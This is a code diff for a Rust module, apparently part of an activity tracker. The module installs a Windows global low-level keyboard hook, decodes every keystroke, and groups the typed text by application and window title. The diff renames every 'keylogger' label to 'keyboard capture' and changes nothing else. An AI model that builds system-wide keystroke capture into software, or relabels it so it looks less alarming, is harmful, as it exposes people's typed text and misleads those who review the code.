@@ -1,11 +1,11 @@
-//! Keyboard monitoring with Unicode decoding, window-context buffering, and
+//! Keyboard capture with Unicode decoding, window-context buffering, and
 //! AFK / active transition detection.
 //!
 //! ## Architecture
 //!
 //! ```text
 //! ┌──────────────────────────────────────────────────────────────────┐
-//! │ OS thread: "keylogger-hook"                                      │
+//! │ OS thread: "keyboard-hook"                                      │
 //! │   SetWindowsHookExW(WH_KEYBOARD_LL)                             │
 //! │   → decode keystroke (GetAsyncKeyState + ToUnicodeEx)           │
 //! │   → std::sync::mpsc sync_channel (cap 512)                      │
@@ -13,7 +13,7 @@
 //!                  │
 //!                  ▼
 //! ┌──────────────────────────────────────────────────────────────────┐
-//! │ OS thread: "keylogger-decoder"                                   │
+//! │ OS thread: "keyboard-decoder"                                   │
 //! │   Buffers decoded chars grouped by (app, window title).         │
 //! │   Flushes on: window switch | 200-char limit | 5-s silence      │
 //! │   → tokio::sync::mpsc::UnboundedSender<InputEvent>              │
@@ -60,7 +60,7 @@ const FLUSH_CHARS: usize = 200;
 /// Flush remaining buffer after this many seconds of keyboard silence.
 const FLUSH_TIMEOUT_SECS: u64 = 5;
 
-/// An event produced by the keylogger subsystem.
+/// An event produced by the keyboard capture subsystem.
 #[derive(Debug, Clone)]
 pub enum InputEvent {
     /// A decoded burst of keystrokes associated with a specific window.
@@ -185,16 +185,16 @@ unsafe fn decode_key(vk: u32, scan: u32) -> String {
 /// Install the keyboard hook and start background threads / tasks.
 ///
 /// All [`InputEvent`]s (keystrokes + AFK transitions) are delivered on
-/// `out_tx`.  The hook remains active for the lifetime of the process.
+/// `out_tx`. The hook remains active for the lifetime of the process.
 pub fn start(out_tx: UnboundedSender<InputEvent>) -> anyhow::Result<()> {
     let (raw_tx, raw_rx) = std::sync::mpsc::sync_channel::<String>(512);
     HOOK_TX
         .set(raw_tx)
-        .map_err(|_| anyhow::anyhow!("Keylogger already started"))?;
+        .map_err(|_| anyhow::anyhow!("Keyboard capture already started"))?;
 
     // ── Hook thread: message pump required on the same thread as SetWindowsHookExW ──
     std::thread::Builder::new()
-        .name("keylogger-hook".into())
+        .name("keyboard-hook".into())
         .spawn(|| unsafe {
             let hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_proc), None, 0)
                 .expect("SetWindowsHookExW failed");
@@ -215,7 +215,7 @@ pub fn start(out_tx: UnboundedSender<InputEvent>) -> anyhow::Result<()> {
     // ── Decoder thread: buffer and flush by window context ────────────────
     let out_dec = out_tx.clone();
     std::thread::Builder::new()
-        .name("keylogger-decoder".into())
+        .name("keyboard-decoder".into())
         .spawn(move || run_decoder(raw_rx, out_dec))?;
 
     // ── AFK watcher: Tokio async task ─────────────────────────────────────
